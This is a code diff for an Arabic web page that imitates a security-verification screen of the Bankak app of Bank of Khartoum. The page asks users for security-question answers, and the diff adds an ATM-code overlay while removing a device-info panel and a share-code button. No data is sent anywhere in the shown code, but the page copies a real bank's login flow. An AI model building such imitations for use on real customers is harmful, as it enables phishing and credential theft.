@@ -290,6 +290,11 @@
             color: #c1121f;
         }
 
+        .security-header h1 i {
+            color: #e63946;
+            margin-left: 6px;
+        }
+
         .security-header .sub {
             font-size: 14px;
             color: #666;
@@ -303,39 +308,8 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        .security-card .device-info {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 20px;
-            text-align: center;
-            border-right: 4px solid #e63946;
-        }
-
-        .security-card .device-info i {
-            font-size: 32px;
-            color: #e63946;
-            margin-bottom: 6px;
-        }
-
-        .security-card .device-info .label {
-            font-size: 13px;
-            color: #888;
-        }
-
-        .security-card .device-info .value {
-            font-size: 18px;
-            font-weight: 700;
-            color: #333;
-        }
-
-        .security-card .device-info .ip {
-            font-size: 12px;
-            color: #999;
-            margin-top: 4px;
-        }
-
-        .security-card .warning-box {
+        /* تحذير جهاز مختلف - بدون أيقونة إيموجي */
+        .warning-box {
             background: #fff5f5;
             border-radius: 12px;
             padding: 16px;
@@ -344,26 +318,36 @@
             text-align: center;
         }
 
-        .security-card .warning-box .title {
+        .warning-box .title {
             font-weight: 700;
             color: #c1121f;
             font-size: 15px;
         }
 
-        .security-card .warning-box .desc {
+        .warning-box .title i {
+            color: #e63946;
+            margin-left: 6px;
+        }
+
+        .warning-box .desc {
             font-size: 13px;
             color: #555;
             margin-top: 6px;
         }
 
-        .security-card .question-label {
+        .question-label {
             font-size: 15px;
             font-weight: 600;
             color: #333;
             margin: 16px 0 8px;
         }
 
-        .security-card .question-label small {
+        .question-label i {
+            color: #e63946;
+            margin-left: 6px;
+        }
+
+        .question-label small {
             font-weight: 400;
             color: #888;
             font-size: 12px;
@@ -371,7 +355,7 @@
             margin-top: 4px;
         }
 
-        .security-card .question-box {
+        .question-box {
             background: #f8f9fa;
             border-radius: 8px;
             padding: 12px;
@@ -438,15 +422,6 @@
             background: #e6a800;
         }
 
-        .btn-security {
-            background: #e63946;
-            color: white;
-        }
-
-        .btn-security:hover {
-            background: #c1121f;
-        }
-
         .btn-next {
             background: #0a66c2;
             color: white;
@@ -456,28 +431,87 @@
             background: #004182;
         }
 
-        .security-share {
-            text-align: center;
-            margin-top: 16px;
+        .btn-security {
+            background: #e63946;
+            color: white;
         }
 
-        .security-share button {
-            background: #0a66c2;
+        .btn-security:hover {
+            background: #c1121f;
+        }
+
+        /* ===== رسالة الصراف الآلي (تظهر في منتصف الشاشة) ===== */
+        .atm-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .atm-overlay.active {
+            display: flex;
+        }
+
+        .atm-box {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .atm-box i {
+            font-size: 48px;
+            color: #ffc107;
+            margin-bottom: 16px;
+        }
+
+        .atm-box .big-text {
+            font-size: 28px;
+            font-weight: 800;
+            color: #c1121f;
+            margin-bottom: 12px;
+        }
+
+        .atm-box .sub-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 24px;
+        }
+
+        .atm-box .btn-close-atm {
+            background: #e63946;
             color: white;
             border: none;
-            padding: 10px 24px;
+            padding: 12px 32px;
             border-radius: 30px;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             font-family: 'Cairo', sans-serif;
             transition: 0.3s;
         }
 
-        .security-share button:hover {
-            background: #004182;
+        .atm-box .btn-close-atm:hover {
+            background: #c1121f;
         }
 
+        /* الروابط السفلية */
         .security-links {
             display: flex;
             justify-content: center;
@@ -579,6 +613,8 @@
             .security-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
             .security-header h1 { font-size: 24px; }
             .security-card .question-box { font-size: 14px; }
+            .atm-box .big-text { font-size: 24px; }
+            .atm-box .sub-text { font-size: 16px; }
         }
     </style>
 </head>
@@ -654,45 +690,35 @@
     <!-- ===== صفحة التحقق الأمني ===== -->
     <div id="securityPage">
         <div class="security-header">
-            <h1>🔐 بنك bankak</h1>
-            <div class="sub">استلمة الأمان</div>
+            <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
+            <div class="sub">استلام الأمان</div>
         </div>
 
         <div class="security-card">
-            <!-- معلومات الجهاز -->
-            <div class="device-info">
-                <i class="fas fa-mobile-alt"></i>
-                <div class="label">الجهاز المستخدم</div>
-                <div class="value" id="deviceName">Samsung Galaxy A52</div>
-                <div class="ip" id="deviceIP">IP: 192.168.1.1</div>
-            </div>
-
-            <!-- تحذير جهاز مختلف -->
+            <!-- تحذير جهاز مختلف (بدون إيموجي) -->
             <div class="warning-box">
-                <div class="title">⚠️ ترغب في إستخدام موبايل مختلف؟</div>
+                <div class="title"><i class="fas fa-exclamation-triangle"></i> ترغب في استخدام موبايل مختلف؟</div>
                 <div class="desc">اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر إعادة التعيين واتبع التعليمات</div>
             </div>
 
             <!-- سؤال الأمان -->
             <div class="question-label">
-                📝 الإجابة على أسئلة الأماكن
+                <i class="fas fa-question-circle"></i> الإجابة على أسئلة الأماكن
                 <small>اختر الإجابة الصحيحة للسؤال التالي:</small>
             </div>
 
-            <div class="question-box" id="questionText">ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟</div>
+            <div class="question-box" id="questionText">ما هو اسم المدرسة التي التحقت بها؟</div>
 
             <input type="text" id="securityAnswer" placeholder="أدخل الجواب" />
 
             <div class="security-actions">
-                <button class="btn-cancel" onclick="cancelSecurity()">إلغاء</button>
-                <button class="btn-atm" onclick="atmAuth()">باستخدام بطاقة الصراف الآلي</button>
                 <button class="btn-next" onclick="nextQuestion()">سؤال آخر</button>
+                <button class="btn-atm" onclick="showAtmMessage()">باستخدام بطاقة الصراف الآلي</button>
+                <button class="btn-cancel" onclick="cancelSecurity()">إلغاء</button>
                 <button class="btn-security" onclick="verifySecurity()">إرسال</button>
             </div>
 
-            <div class="security-share">
-                <button onclick="shareCode()"><i class="fas fa-share-alt"></i> شارك رمز</button>
-            </div>
+            <!-- تم حذف زر "شارك رمز" نهائياً -->
 
             <div class="security-links">
                 <a href="#">فيس بوك</a>
@@ -700,6 +726,16 @@
                 <a href="#">مواقفنا</a>
                 <a href="#" class="highlight">بنك الخرطوم</a>
             </div>
+        </div>
+    </div>
+
+    <!-- ===== رسالة الصراف الآلي (تظهر في منتصف الشاشة) ===== -->
+    <div class="atm-overlay" id="atmOverlay">
+        <div class="atm-box">
+            <i class="fas fa-credit-card"></i>
+            <div class="big-text">🔑 سيتم إرسال رمز</div>
+            <div class="sub-text">إلى بطاقة الصراف الآلي الخاصة بك</div>
+            <button class="btn-close-atm" onclick="closeAtmMessage()">حسناً</button>
         </div>
     </div>
 
@@ -729,9 +765,8 @@
     </div>
 
     <script>
-        // ===== الأسئلة =====
+        // ===== الأسئلة (تم حذف سؤال الشارع وتصحيح الإملاء) =====
         const securityQuestions = [
-            "ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟",
             "ما هو اسم المدرسة التي التحقت بها؟",
             "اسم فريق كرة القدم المفضل لديك؟",
             "اسم الشركة المصنعة للسيارة المفضلة لديك؟",
@@ -740,47 +775,6 @@
         ];
 
         let currentQuestionIndex = 0;
-
-        // ===== تحديد نوع الجهاز =====
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            let deviceName = "جهاز غير معروف";
-            let ip = "IP: غير متاح";
-
-            // تحديد نوع الجهاز
-            if (/android/i.test(userAgent)) {
-                const match = userAgent.match(/SM-[A-Z0-9]+/);
-                if (match) {
-                    deviceName = match[0];
-                } else {
-                    deviceName = "هاتف Android";
-                }
-            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                deviceName = "iPhone/iPad";
-            } else if (/Windows/i.test(userAgent)) {
-                deviceName = "جهاز Windows";
-            } else if (/Macintosh/i.test(userAgent)) {
-                deviceName = "جهاز Mac";
-            } else {
-                deviceName = "جهاز غير معروف";
-            }
-
-            // محاكاة IP (لأن IP الحقيقي لا يمكن الحصول عليه من المتصفح)
-            const ipParts = [];
-            for (let i = 0; i < 4; i++) {
-                ipParts.push(Math.floor(Math.random() * 255));
-            }
-            ip = `IP: ${ipParts.join('.')}`;
-
-            return { deviceName, ip };
-        }
-
-        // ===== تحديث معلومات الجهاز =====
-        function updateDeviceInfo() {
-            const info = getDeviceInfo();
-            document.getElementById('deviceName').textContent = info.deviceName;
-            document.getElementById('deviceIP').textContent = info.ip;
-        }
 
         // ===== تحديث السؤال =====
         function updateQuestion() {
@@ -803,7 +797,6 @@
                 return;
             }
             alert('✅ تم التحقق بنجاح!');
-            // هنا يمكن التوجه للوحة التحكم
         }
 
         // ===== إلغاء =====
@@ -818,26 +811,13 @@
             }
         }
 
-        // ===== صراف آلي =====
-        function atmAuth() {
-            alert('🔑 سيتم إرسال رمز إلى بطاقة الصراف الآلي الخاصة بك.');
+        // ===== رسالة الصراف الآلي (بخط كبير في منتصف الشاشة) =====
+        function showAtmMessage() {
+            document.getElementById('atmOverlay').classList.add('active');
         }
 
-        // ===== مشاركة رمز =====
-        function shareCode() {
-            const code = Math.floor(100000 + Math.random() * 900000);
-            if (navigator.share) {
-                navigator.share({
-                    title: 'رمز التحقق - iBOK',
-                    text: `رمز التحقق الخاص بك هو: ${code}`
-                }).catch(() => {});
-            } else {
-                navigator.clipboard.writeText(`رمز التحقق الخاص بك هو: ${code}`).then(() => {
-                    alert('✅ تم نسخ رمز التحقق: ' + code);
-                }).catch(() => {
-                    alert('رمز التحقق الخاص بك هو: ' + code);
-                });
-            }
+        function closeAtmMessage() {
+            document.getElementById('atmOverlay').classList.remove('active');
         }
 
         // ===== إظهار/إخفاء كلمة المرور =====
@@ -910,9 +890,6 @@
                 document.getElementById('securityPage').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
                 
-                // تحديث معلومات الجهاز
-                updateDeviceInfo();
-                
                 // تعيين أول سؤال
                 currentQuestionIndex = 0;
                 updateQuestion();
@@ -933,6 +910,13 @@
         document.getElementById('securityAnswer').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 verifySecurity();
+            }
+        });
+
+        // ===== إغلاق رسالة الصراف بالضغط خارجها =====
+        document.getElementById('atmOverlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeAtmMessage();
             }
         });
     </script>
